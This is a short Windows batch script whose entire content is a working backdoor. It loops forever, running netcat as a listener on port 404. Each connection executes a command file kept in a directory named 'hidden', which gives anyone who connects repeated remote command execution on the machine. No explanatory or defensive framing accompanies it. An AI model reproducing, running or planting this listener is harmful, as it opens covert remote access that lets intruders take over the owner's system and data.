@echo off
 :loop
 nc -L -p 404 -e c:\hidden\auth.cmd
 goto loop